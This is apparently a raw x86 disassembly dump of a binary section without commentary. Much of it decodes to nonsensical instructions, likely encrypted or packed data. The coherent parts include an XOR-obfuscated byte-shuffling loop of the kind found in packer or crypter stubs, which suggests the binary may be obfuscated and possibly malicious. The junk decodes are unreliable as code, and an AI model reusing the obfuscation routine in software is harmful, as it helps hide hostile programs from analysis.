  40614f:	test   al,bh
  406151:	xchg   edi,eax
  406152:	mov    dh,0xe4
  406154:	test   al,0xb7
  406156:	and    BYTE PTR ds:[ebp+0x7f3921ed],al
  40615d:	jne    0x40617c
  40615f:	mov    edx,0x9ecdc633
  406164:	aas    
  406165:	adc    eax,0xdaf40081
  40616a:	sbb    BYTE PTR [esi],dh
  40616c:	(bad)  
  40616d:	jmp    0xe0a6:0xd42314fa
  406174:	in     al,0x3f
  406176:	ja     0x40613f
  406178:	sub    bl,BYTE PTR [ecx]
  40617a:	rol    BYTE PTR [edi],1
  40617c:	push   cs
  40617d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40617e:	stos   BYTE PTR es:[edi],al
  40617f:	adc    ebx,DWORD PTR [ecx]
  406181:	js     0x406189
  406183:	fcmovbe st,st(6)
  406185:	je     0x40619f
  406187:	mov    ss,esi
  406189:	mov    ah,0x2
  40618b:	xchg   BYTE PTR [edi+ebp*8],bh
  40618e:	jne    0x406133
  406190:	das    
  406191:	mov    bh,BYTE PTR [ebp+0x66]
  406194:	rol    DWORD PTR [eax-0x10a01886],0x69
  40619b:	add    BYTE PTR [esi],bh
  40619d:	ret    0xe962
  4061a0:	bound  edi,QWORD PTR [ebx-0x42]
  4061a3:	repz inc esp
  4061a5:	fnstcw WORD PTR [esi+eax*1]
  4061a8:	mov    esp,0x5fee31bd
  4061ad:	imul   eax,DWORD PTR [ebp-0x79],0x5b
  4061b1:	outs   dx,BYTE PTR ds:[esi]
  4061b2:	inc    esi
  4061b3:	add    BYTE PTR [ebp*4-0x4be1a16f],dl
  4061ba:	and    cl,BYTE PTR [esi-0x632be4ef]
  4061c0:	mov    edi,0xfa31b37f
  4061c5:	cmp    eax,0x3520854a
  4061ca:	shr    BYTE PTR [edx+0x2d],cl
  4061cd:	arpl   WORD PTR [ebp-0x1f31f600],di
  4061d3:	imul   esp,DWORD PTR [eax+ebp*8],0x4597f345
  4061da:	icebp  
  4061db:	fisubr WORD PTR [ebx-0x52]
  4061de:	sbb    cl,ah
  4061e0:	sub    eax,0xfc71ff7a
  4061e5:	mov    eax,0xffb7fbb0
  4061ea:	pusha  
  4061eb:	dec    ebx
  4061ec:	dec    edi
  4061ed:	cmp    al,ah
  4061ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061f0:	fadd   DWORD PTR [edx]
  4061f2:	dec    esp
  4061f3:	add    edi,ecx
  4061f5:	repz iret 
  4061f7:	div    DWORD PTR [ebx+0x10]
  4061fa:	nop
  4061fb:	mov    bh,0x86
  4061fd:	push   ds
  4061fe:	ds cli 
  406200:	sbb    al,BYTE PTR [ebp-0x18]
  406203:	and    cl,BYTE PTR [ecx-0x5c964e2f]
  406209:	into   
  40620a:	add    BYTE PTR [eax-0x3a43a29a],al
  406210:	in     al,0xc1
  406212:	ss jl  0x406204
  406215:	out    0xcc,eax
  406217:	or     edx,esp
  406219:	arpl   WORD PTR [ebx-0x279035c3],si
  40621f:	enter  0xb3a8,0xb2
  406223:	dec    edi
  406224:	pushf  
  406225:	inc    ecx
  406226:	lea    edx,[ecx]
  406228:	dec    esi
  406229:	jnp    0x406275
  40622b:	leave  
  40622c:	push   ecx
  40622d:	dec    esi
  40622e:	pop    esp
  40622f:	jno    0x406228
  406231:	mov    eax,0xed5362a2
  406236:	test   DWORD PTR [ecx+0x10e2f161],esi
  40623c:	mov    bl,0x22
  40623e:	call   0x84d68a3f
  406243:	nop
  406244:	cmp    eax,0x12ba995f
  406249:	inc    esp
  40624a:	outs   dx,BYTE PTR ds:[esi]
  40624b:	dec    ecx
  40624c:	stos   DWORD PTR es:[edi],eax
  40624d:	fidiv  WORD PTR [eax+0x3f94ddf4]
  406253:	(bad)  
  406254:	fwait
  406255:	pop    es
  406256:	push   cs
  406257:	adc    bl,BYTE PTR [ecx-0x19082629]
  40625d:	or     al,0x94
  40625f:	push   edi
  406260:	punpcklwd mm4,mm3
  406263:	jle    0x4061f7
  406265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406266:	out    0xf1,al
  406268:	fidiv  WORD PTR [esi]
  40626a:	jg     0x406229
  40626c:	pop    ebx
  40626d:	mov    bh,0xac
  40626f:	iret   
  406270:	fistp  WORD PTR [esi]
  406272:	cmp    al,bh
  406274:	push   ebp
  406275:	out    0xdf,eax
  406277:	(bad)  
  406278:	retf   
  406279:	sbb    cl,BYTE PTR [edx-0x5c]
  40627c:	xchg   ecx,eax
  40627d:	dec    ebx
  40627e:	dec    edx
  40627f:	xor    DWORD PTR [ebx+0x24],eax
  406282:	arpl   WORD PTR [edx+0x8],si
  406285:	push   cs
  406286:	fsubr  QWORD PTR [esi-0xb59abb9]
  40628c:	inc    edi
  40628d:	enterw 0xfdc0,0x59
  406292:	adc    al,0xfa
  406294:	(bad)  
  406296:	cli    
  406297:	sbb    ah,0x27
  40629a:	pop    eax
  40629b:	and    eax,0x61a22e2f
  4062a0:	test   al,0x78
  4062a2:	lods   al,BYTE PTR ds:[esi]
  4062a3:	sub    DWORD PTR [ebx+0x44],eax
  4062a6:	test   BYTE PTR [ebx+0x427c1df5],bl
  4062ac:	or     DWORD PTR [ebx+0x71],esp
  4062af:	pop    ecx
  4062b0:	and    DWORD PTR [edi+ebx*2-0x18],ebx
  4062b4:	jmp    0xd1870be3
  4062b9:	add    esp,esi
  4062bb:	mov    bh,BYTE PTR ds:0x2b718abd
  4062c1:	pop    eax
  4062c2:	mov    esp,DWORD PTR [edx-0x2d]
  4062c5:	add    eax,0x506ed9b5
  4062ca:	outs   dx,DWORD PTR ds:[esi]
  4062cb:	data16 cs aad 0xd9
  4062cf:	add    BYTE PTR [esi-0x1b],bh
  4062d2:	xchg   ecx,eax
  4062d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062d4:	pop    ebx
  4062d5:	ja     0x4062f2
  4062d7:	lods   eax,DWORD PTR ds:[esi]
  4062d8:	push   ebx
  4062d9:	xchg   edi,eax
  4062da:	adc    esi,DWORD PTR [ebx+0x2badc079]
  4062e0:	test   DWORD PTR [edx],0xa0f1e400
  4062e6:	test   DWORD PTR [esi+ebp*2],esp
  4062e9:	pop    eax
  4062ea:	mov    esi,0xe60a23c3
  4062ef:	or     BYTE PTR [eax],cl
  4062f1:	daa    
  4062f2:	mov    esi,DWORD PTR [eax+0x15310d55]
  4062f8:	shr    DWORD PTR [edi-0x499e9b78],cl
  4062fe:	test   DWORD PTR [ebx],0x7fdd9d76
  406304:	fild   WORD PTR [ebp-0x42ec027b]
  40630a:	cdq    
  40630b:	dec    edi
  40630c:	sbb    eax,0xc1b0c54c
  406311:	mov    al,ds:0xd0b677d5
  406316:	cmp    dl,BYTE PTR [ebx-0x472e1758]
  40631c:	shr    BYTE PTR [edx-0x3a],cl
  40631f:	push   0x68
  406321:	jno    0x406365
  406323:	in     al,dx
  406324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406325:	dec    esp
  406326:	sar    DWORD PTR [ebp+0x4e],cl
  406329:	or     al,BYTE PTR [edi+0x65]
  40632c:	nop
  40632d:	inc    ebx
  40632e:	xchg   esi,eax
  40632f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406330:	test   DWORD PTR [ecx+0x63],ecx
  406333:	jns    0x4063a8
  406335:	pop    es
  406336:	aas    
  406337:	sbb    eax,0x30aef653
  40633c:	adc    ch,BYTE PTR [edi]
  40633e:	xor    BYTE PTR [edx-0x4d],al
  406341:	and    DWORD PTR [edi],eax
  406343:	stos   BYTE PTR es:[edi],al
  406344:	jecxz  0x4062dc
  406346:	xlat   BYTE PTR ds:[ebx]
  406347:	jne    0x40633b
  406349:	fwait
  40634a:	sub    eax,0xf20483ce
  40634f:	sbb    al,dh
  406351:	je     0x406301
  406353:	call   esi
  406355:	stos   BYTE PTR es:[edi],al
  406356:	add    eax,0xed8a0fa9
  40635b:	int    0x39
  40635d:	push   ebp
  40635e:	add    al,0xbd
  406360:	mov    ch,BYTE PTR ds:0xae9d6caf
  406366:	pop    ebx
  406367:	out    dx,al
  406368:	inc    ebx
  406369:	jge    0x406351
  40636b:	mov    dl,0x2a
  40636d:	sub    al,0xbd
  40636f:	pop    esp
  406370:	cmp    eax,0x3df53f4e
  406375:	fdivrp st(0),st
  406377:	mov    BYTE PTR [ecx+0x3c4f178d],bl
  40637d:	mov    edx,esi
  40637f:	xor    esp,DWORD PTR [ecx]
  406381:	and    al,bh
  406383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406384:	and    DWORD PTR [ebx-0x5df8d8f6],esi
  40638a:	rcl    ebx,1
  40638c:	dec    edi
  40638d:	dec    edx
  40638e:	inc    ebx
  40638f:	test   eax,0xb02fb3fa
  406394:	mov    ds:0x4f5e565f,eax
  406399:	xor    DWORD PTR [edx],ecx
  40639b:	inc    eax
  40639c:	in     al,0x42
  40639e:	jmp    0x6c69192e
  4063a3:	iret   
  4063a4:	adc    edi,esi
  4063a6:	fistp  DWORD PTR [edx+0x29ce0453]
  4063ac:	iret   
  4063ad:	daa    
  4063ae:	xchg   DWORD PTR [eax+0x482320af],ebx
  4063b4:	repnz push eax
  4063b6:	stc    
  4063b7:	std    
  4063b8:	jns    0x4063a7
  4063ba:	sahf   
  4063bb:	sbb    dl,BYTE PTR [ebp-0xb178a1b]
  4063c1:	adc    eax,0xd445a540
  4063c6:	dec    edx
  4063c7:	(bad)  
  4063c8:	mov    esi,0x3ee4b32a
  4063cd:	popf   
  4063ce:	or     al,0x9d
  4063d0:	xor    ecx,0x3860faa
  4063d6:	add    BYTE PTR [eax],al
  4063d8:	add    BYTE PTR [ebx+0x7d8bc455],cl
  4063de:	cld    
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	scas   al,BYTE PTR es:[edi]
  40645f:	sub    dh,BYTE PTR [ecx+0x17]
  406462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406463:	cmp    BYTE PTR [esi+0x7e],bh
  406466:	xor    edi,DWORD PTR [ebp+0x7e]
  406469:	jle    0x4064ca
  40646b:	outs   dx,BYTE PTR ds:[esi]
  40646c:	cmc    
  40646d:	aaa    
  40646e:	out    dx,al
  40646f:	inc    ebp
  406470:	stos   DWORD PTR es:[edi],eax
  406471:	loop   0x4064a2
  406473:	sub    ebp,ebx
  406475:	and    BYTE PTR [edx+eiz*1+0x30],bl
  406479:	xor    al,0x55
  40647b:	fmul   DWORD PTR [ecx+0x11]
  40647e:	inc    edx
  40647f:	xlat   BYTE PTR ds:[ebx]
  406480:	cs xor al,0x1e
  406483:	xchg   edx,eax
  406484:	ret    
  406485:	cmc    
  406486:	inc    esp
  406487:	mov    ds:0x955d346f,al
  40648c:	adc    bh,BYTE PTR [edi*2+0x2c5c54ea]
  406493:	or     eax,0x80e30422
  406498:	(bad)  
  406499:	dec    esi
  40649a:	inc    edi
  40649b:	and    bh,al
  40649d:	in     eax,dx
  40649e:	jecxz  0x40646e
  4064a0:	test   DWORD PTR [edx+ebp*4-0x2099c0b4],edi
  4064a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064a8:	mov    ?,WORD PTR [ebp+0x168b507c]
  4064ae:	frstor [ecx]
  4064b0:	mov    esp,0x765487e7
  4064b5:	mov    bh,0x42
  4064b7:	(bad)  
  4064b8:	ficomp DWORD PTR [edi-0x5c84a5ed]
  4064be:	pop    esi
  4064bf:	mov    dl,0x83
  4064c1:	iret   
  4064c2:	daa    
  4064c3:	push   eax
  4064c4:	aam    0x19
  4064c6:	sbb    DWORD PTR [edx+0x66],edx
  4064c9:	xor    DWORD PTR [edi+0x25],eax
  4064cc:	xchg   edi,eax
  4064cd:	aaa    
  4064ce:	(bad)  
  4064cf:	and    DWORD PTR [esi-0x52],ebx
  4064d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064d3:	push   eax
  4064d4:	sub    eax,0xd97d30bb
  4064d9:	cwde   
  4064da:	xchg   DWORD PTR [edi+ebp*1-0x32],esp
  4064de:	leave  
  4064df:	call   0x2d67a8b7
  4064e4:	jge    0x298ff5ea
  4064ea:	mov    ds:0x2cde5d7d,eax
  4064ef:	sub    al,0xe4
  4064f1:	mov    eax,ds:0x21798409
  4064f6:	test   eax,0x80d55840
  4064fb:	rol    BYTE PTR [ebp-0x4b],1
  4064fe:	test   al,0xfb
  406500:	xlat   BYTE PTR ds:[ebx]
  406501:	sub    BYTE PTR es:[edx],ch
  406504:	in     eax,dx
  406505:	mov    esi,0x885d1cb8
  40650a:	adc    BYTE PTR [edx+0x6e6ef1a9],dh
  406510:	(bad)  
  406511:	nop
  406512:	cmc    
  406513:	xor    bl,dl
  406515:	jnp    0x406569
  406517:	pop    esp
  406518:	jnp    0x406555
  40651a:	call   DWORD PTR [ebx+0x3e]
  40651d:	push   ebx
  40651e:	popa   
  40651f:	mov    dl,BYTE PTR [eax-0x58]
  406522:	inc    esi
  406523:	mov    ?,WORD PTR [edx-0x4008e117]
  406529:	push   esp
  40652a:	jb     0x40657e
  40652c:	push   ss
  40652d:	loopne 0x4065a9
  40652f:	sti    
  406530:	out    dx,al
  406531:	xlat   BYTE PTR ds:[ebx]
  406532:	nop
  406533:	push   esi
  406534:	jg     0x40653b
  406536:	dec    esi
  406537:	int3   
  406538:	or     BYTE PTR [edx+0x68],0x3d
  40653c:	cmc    
  40653d:	sub    eax,0x8afb70b7
  406542:	ins    DWORD PTR es:[edi],dx
  406543:	pop    ss
  406544:	(bad)  
  406546:	xchg   esi,eax
  406547:	xor    bl,dh
  406549:	push   eax
  40654a:	jno    0x406561
  40654c:	in     eax,dx
  40654d:	mov    ah,0x17
  40654f:	stc    
  406550:	xor    edx,eax
  406552:	aam    0x69
  406554:	jmp    DWORD PTR [edx-0x77]
  406557:	push   ecx
  406558:	pop    ebp
  406559:	sub    esp,esp
  40655b:	jg     0x4064f9
  40655d:	nop
  40655e:	add    ch,BYTE PTR [ebp-0x6f]
  406561:	jmp    0x40653b
  406563:	inc    edi
  406564:	sbb    eax,0xba0cf0db
  406569:	test   DWORD PTR [edx+0x4cabe1f3],ebp
  40656f:	jmp    0x4d3946b8
  406574:	fstp   QWORD PTR [edx]
  406576:	xchg   ebx,eax
  406577:	into   
  406578:	in     al,0xf7
  40657a:	inc    edi
  40657b:	sub    eax,0x3d2f028a
  406580:	inc    sp
  406582:	cld    
  406583:	xchg   edx,eax
  406584:	mov    ecx,0x851fb0f3
  406589:	sbb    BYTE PTR [ebx-0xa],0x88
  40658d:	mov    esp,edx
  40658f:	xlat   BYTE PTR ds:[ebx]
  406590:	les    edi,FWORD PTR [ecx-0x79]
  406593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406594:	cmp    dl,BYTE PTR ss:[esi+0x5fc72edb]
  40659b:	mov    edi,DWORD PTR [ebp+esi*4-0x3c2e6268]
  4065a2:	sub    DWORD PTR [ebx+edi*1],0x4306b83a
  4065a9:	fadd   st,st(4)
  4065ab:	sbb    eax,0xd7de4ba9
  4065b0:	int    0x87
  4065b2:	in     al,0x35
  4065b4:	jle    0x40659e
  4065b6:	shl    BYTE PTR [eax+ecx*8-0x1d],cl
  4065ba:	and    DWORD PTR [eax],edi
  4065bc:	out    dx,al
  4065bd:	imul   edx,DWORD PTR [edi],0x37
  4065c0:	xor    edx,DWORD PTR [eax+ecx*2]
  4065c3:	jo     0x406611
  4065c5:	fcomi  st,st(7)
  4065c7:	xor    DWORD PTR [ebx],eax
  4065c9:	adc    eax,0xfacb9575
  4065ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065cf:	mov    ds:0xac73f7ee,al
  4065d4:	hlt    
  4065d5:	adc    DWORD PTR [ecx+0x63e183c1],edi
  4065db:	xchg   edx,eax
  4065dc:	jg     0x4065f3
  4065de:	pop    ebx
  4065df:	adc    al,0x92
  4065e1:	jle    0x406622
  4065e3:	in     al,0x39
  4065e5:	sbb    dl,BYTE PTR [eax-0x7a]
  4065e8:	scas   al,BYTE PTR es:[edi]
  4065e9:	rcr    DWORD PTR [eax-0x4b],1
  4065ec:	stos   BYTE PTR es:[edi],al
  4065ed:	pop    esi
  4065ee:	jmp    0x4065c0
  4065f0:	xchg   dh,ch
  4065f2:	cmp    ebx,DWORD PTR [esi+ebp*1]
  4065f5:	mov    ds:0x3f18a400,al
  4065fa:	imul   ebx,DWORD PTR [edx],0x1c
  4065fd:	push   ebx
  4065fe:	adc    DWORD PTR ds:0xd1b5e893,esp
  406604:	imul   ecx,ebx,0xffffff9c
  406607:	mov    ah,0xaf
  406609:	pop    esi
  40660a:	adc    eax,0x550d71d3
  40660f:	iret   
  406610:	gs cmp eax,0xa7922244
  406616:	jne    0x4065d4
  406618:	pop    fs
  40661a:	mov    bh,BYTE PTR [edi+0x22]
  40661d:	inc    esp
  40661e:	mov    ebx,0x483e292c
  406623:	out    dx,eax
  406624:	inc    esp
  406625:	call   0x51f1:0x4ecd0138
  40662c:	jo     0x4065e2
  40662e:	shl    edx,1
  406630:	fmulp  st(3),st
  406632:	lods   eax,DWORD PTR ds:[esi]
  406633:	cli    
  406634:	ins    BYTE PTR es:[edi],dx
  406635:	fsub   DWORD PTR [esi-0x21]
  406638:	sbb    DWORD PTR [edi-0x13e385c2],0xf89a2d90
  406642:	dec    edx
  406643:	mov    cl,0xaf
  406645:	lods   eax,DWORD PTR ds:[esi]
  406646:	sub    BYTE PTR ds:0xf110b2e1,ah
  40664c:	adc    al,0xbd
  40664e:	dec    eax
  40664f:	test   al,0x87
  406651:	inc    ebp
  406652:	or     edx,esp
  406654:	addr16 jmp 0x4066ad
  406657:	ins    DWORD PTR es:[edi],dx
  406658:	inc    esi
  406659:	lods   al,BYTE PTR ds:[esi]
  40665a:	imul   edi,DWORD PTR [ecx+0x6d],0x1cf525b0
  406661:	mov    ebx,0xf4b7fd76
  406667:	jecxz  0x40669b
  406669:	pop    eax
  40666a:	mov    bl,ch
  40666c:	(bad)  [edi-0x1b7c1bb0]
  406672:	inc    ebp
  406673:	call   0xe1b7:0xb5da5b5b
  40667a:	retf   
  40667b:	mov    gs,WORD PTR [esi]
  40667d:	add    al,0x2a
  40667f:	or     eax,0x815389da
  406684:	mov    ecx,0xed4f637f
  406689:	(bad)  
  40668a:	aad    0xa5
  40668c:	or     eax,0xffffff96
  40668f:	les    esp,FWORD PTR [ecx+0x0]
  406692:	push   edi
  406693:	out    0x2f,eax
  406695:	imul   edi,DWORD PTR ds:0x88b2b885,0xaec23c52
  40669f:	iret   
  4066a0:	or     DWORD PTR [eax],esi
  4066a2:	mov    ds:0x61e43ba5,eax
  4066a7:	in     eax,dx
  4066a8:	popa   
  4066a9:	lods   eax,DWORD PTR ds:[esi]
  4066aa:	jae    0x40667e
  4066ac:	adc    ah,ah
  4066ae:	int    0xa8
  4066b0:	mov    al,0xb
  4066b2:	out    0x29,eax
  4066b4:	push   0xffffffa9
  4066b6:	aaa    
  4066b7:	aad    0x1a
  4066b9:	adc    DWORD PTR [esi],esp
  4066bb:	sbb    esi,eax
  4066bd:	mov    DWORD PTR [ecx-0x2f],esi
  4066c0:	mov    al,BYTE PTR [esp+edi*1]
  4066c3:	xchg   BYTE PTR [ebp-0x18],al
  4066c6:	cmovno eax,DWORD PTR [edi]
  4066c9:	inc    esi
  4066ca:	dec    ebx
  4066cb:	das    
  4066cc:	or     BYTE PTR [ebx-0x75],dl
  4066cf:	fsub   QWORD PTR [esi]
  4066d1:	scas   al,BYTE PTR es:[edi]
  4066d2:	je     0x406749
  4066d4:	mov    eax,ds:0x87059068
  4066d9:	push   edi
  4066da:	imul   ebp,DWORD PTR [edx+0x691e6202],0x801770cc
  4066e4:	pop    edi
  4066e5:	jb     0x406744
  4066e7:	jmp    0x396d:0x60b6cb86
  4066ee:	aas    
  4066ef:	test   BYTE PTR [ebp-0x1df67807],dh
  4066f5:	and    eax,0xd39bc9a8
  4066fa:	pop    ds
  4066fb:	pop    ds
  4066fc:	out    0xc,al
  4066fe:	test   al,0x73
  406700:	adc    DWORD PTR [ecx+esi*4],ebx
  406703:	or     dl,BYTE PTR [esi+0x6c]
  406706:	sub    eax,0x343ca677
  40670b:	rol    BYTE PTR [esi+ebp*1-0x4f19e0ea],cl
  406712:	mov    ah,0x6
  406714:	sbb    eax,DWORD PTR [ebx]
  406716:	cld    
  406717:	outs   dx,BYTE PTR ds:[esi]
  406718:	or     eax,0x2150f554
  40671d:	js     0x4066e9
  40671f:	mov    al,ds:0xb5c9bf01
  406724:	sbb    dh,BYTE PTR ds:0xd6bce9f1
  40672a:	xor    al,0x51
  40672c:	ins    DWORD PTR es:[edi],dx
  40672d:	or     esi,DWORD PTR [eax+eax*8-0x7487bc13]
  406734:	rol    BYTE PTR [edx-0x19],0x77
  406738:	outs   dx,DWORD PTR ds:[esi]
  406739:	inc    ecx
  40673a:	ds xchg edi,eax
  40673c:	sbb    DWORD PTR [edx-0x60d7572],edi
  406742:	out    dx,al
  406743:	push   edx
  406744:	lea    esp,[eax+edx*4-0x49c7a127]
  40674b:	lods   al,BYTE PTR ds:[esi]
  40674c:	mov    dl,0xd0
  40674e:	mov    ah,0x43
  406750:	imul   edi,DWORD PTR [ecx],0x4ba5456e
  406756:	int3   
  406757:	imul   ecx,DWORD PTR [edi],0x90b7bb05
  40675d:	pmuludq mm7,QWORD PTR [ebp+0x77]
  406761:	outs   dx,BYTE PTR ds:[esi]
  406762:	hlt    
  406763:	jae    0x4067dc
  406765:	popf   
  406766:	and    al,0x14
  406768:	pusha  
  406769:	sub    ebx,ebp
  40676b:	dec    ecx
  40676c:	daa    
  40676d:	mov    ebx,DWORD PTR [ebx]
  40676f:	imul   esp,DWORD PTR [ebx-0x5],0xffffffe7
  406773:	test   eax,0xdc78acbe
  406778:	fstp   DWORD PTR [edx-0x29]
  40677b:	out    dx,eax
  40677c:	xor    edi,ecx
  40677e:	aam    0x2a
  406780:	mov    dh,0x17
  406782:	cmp    eax,0xe7605751
  406787:	inc    esp
  406788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406789:	rcl    al,0x59
  40678c:	cld    
  40678d:	hlt    
  40678e:	or     ebx,ebp
  406790:	inc    ebp
  406791:	cmp    eax,DWORD PTR [edi+edx*2]
  406794:	test   al,dl
  406796:	test   eax,0x441535da
  40679b:	je     0x4067c2
  40679d:	or     DWORD PTR [ebx-0x15ad703b],0x494b47e6
  4067a7:	xor    edi,eax
  4067a9:	add    edi,DWORD PTR [ebp-0x14]
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x433847
  40686e:	mov    eax,ds:0x43385f
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x43376b,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x43376b
  40688f:	inc    eax
  406890:	mov    ds:0x43376b,eax
  406895:	cmp    DWORD PTR ds:0x43376b,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x43376b,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433910
  4068b9:	push   0x433910
  4068be:	push   0x433867
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x43376b,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x43376b
  4068db:	inc    eax
  4068dc:	mov    ds:0x43376b,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x4337fb,0x433773
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x43382f,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43371f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x4337b3,0x711c
  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x433733,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x4337b7,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x4337f7,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433717,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x4337c3,0x433713
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
